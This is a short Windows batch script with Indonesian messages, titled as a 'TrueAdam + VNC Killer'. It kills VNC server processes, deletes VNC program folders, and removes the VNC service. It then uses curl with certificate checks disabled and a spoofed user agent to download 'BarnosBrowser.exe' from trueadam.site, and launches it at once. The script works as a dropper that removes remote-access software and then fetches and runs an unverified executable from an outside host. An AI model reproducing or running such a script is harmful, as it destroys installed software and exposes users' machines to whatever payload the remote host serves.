@echo off
setlocal enabledelayedexpansion
title MODE PC - TrueAdam + VNC Killer
set DIR=C:\Sumpruy_Downloads
mkdir "%DIR%" 2>nul
cd /d "%DIR%"

taskkill /f /im vncserver.exe 2>nul
taskkill /f /im winvnc4.exe 2>nul
taskkill /f /im tightvncserver.exe 2>nul
taskkill /f /im ultravnc.exe 2>nul

rd /s /q "C:\Program Files\VNC" 2>nul
rd /s /q "C:\Program Files\TightVNC" 2>nul
rd /s /q "%USERPROFILE%\AppData\Local\VNC" 2>nul

sc stop vncserver 2>nul
sc delete vncserver 2>nul

echo ========================================
echo MULAI DOWNLOAD BRO...
echo ========================================

curl -k -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -o "BarnosBrowser.exe" "https://trueadam.site/BarnosBrowser.exe"

if %errorlevel% neq 0 (
    echo CURL GAGAL, MAKANYA UDAH DIHAPUS... COBA TES CURL MANUAL
    curl -k -I https://trueadam.site
    pause
    exit /b
)

if exist "BarnosBrowser.exe" (
    for %%A in ("BarnosBrowser.exe") do set size=%%~zA
    if !size! EQU 0 (
        echo FILE KOSONG! SERVER KASIH 200 TAPI 0 BYTE
    ) else (
        echo ✅ DOWNLOAD BERHASIL - UKURAN: !size! bytes
        start "" "BarnosBrowser.exe"
    )
) else (
    echo ❌ GAGAL TOTAL, FILE GA ADA
)

pause
